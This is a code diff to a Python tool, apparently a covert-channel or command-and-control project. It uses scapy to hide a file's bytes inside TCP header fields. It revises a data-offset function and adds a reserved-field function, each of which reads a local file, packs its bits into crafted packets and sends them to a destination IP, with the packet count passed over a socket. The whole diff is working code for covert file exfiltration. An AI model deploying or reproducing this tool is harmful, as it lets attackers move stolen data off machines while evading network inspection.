@@ -1700,17 +1700,21 @@ def transfer_file_tcp_ack_num(client_sock: socket.socket,
         send(packet, verbose=0)
 
 
-def transfer_file_tcp_hdr_len(client_sock: socket.socket,
-                              dest_ip: str,
-                              dest_port: int,
-                              src_port: int,
-                              file_path: str):
+def transfer_file_tcp_data_offset(client_sock: socket.socket,
+                                  dest_ip: str,
+                                  dest_port: int,
+                                  src_port: int,
+                                  file_path: str):
     """
     Hides file data covertly in TCP headers using the
-    header length field.
+    data-offset field.
+
+    This is also known as the header
+    length that indicates the length of the TCP header
+    and specifies where the data portion starts.
 
     @note Bit length
-        The header length field for TCP headers is 8 bits
+        The data offset field for TCP headers is 4 bits
 
     @param client_sock:
         A socket representing the client socket
@@ -1738,10 +1742,66 @@ def transfer_file_tcp_hdr_len(client_sock: socket.socket,
 
     # c) Put data in packet
     packets = []
-    for i in range(0, len(binary_data), 8):
-        binary_segment = binary_data[i:i + 8].ljust(8, '0')
-        header_length = int(binary_segment, 2)
-        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, len=header_length)
+    for i in range(0, len(binary_data), 4):
+        binary_segment = binary_data[i:i + 4].ljust(4, '0')
+        data_offset = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, dataofs=data_offset)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_reserved(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    reserved field.
+
+    @note Bit length
+        The reserved field for TCP headers is 3 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 3):
+        binary_segment = binary_data[i:i + 3].ljust(3, '0')
+        reserved_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, reserved=reserved_data)
         packets.append(packet)
 
     # d) Send total number of packets to the client
@@ -1845,8 +1905,9 @@ def __get_protocol_header_function_map():
         ("TCP", "Destination Port"): transfer_file_tcp_dst_port,
         ("TCP", "Sequence Number"): transfer_file_tcp_seq_num,
         ("TCP", "Acknowledgement Number"): transfer_file_tcp_ack_num,
-        ("TCP", "Header Length"): transfer_file_tcp_hdr_len,
-        ("TCP", "Flags"): transfer_file_tcp_flags,
+        ("TCP", "Data Offset"): transfer_file_tcp_data_offset,  # FIX
+        ("TCP", "Reserved"): transfer_file_tcp_reserved,  # FIX
+        ("TCP", "Flags"): transfer_file_tcp_flags,  # FIX
         ("TCP", "Window Size"): "F()",
         ("TCP", "Urgent Pointer"): "F()",
         ("TCP", "Options"): "F()",
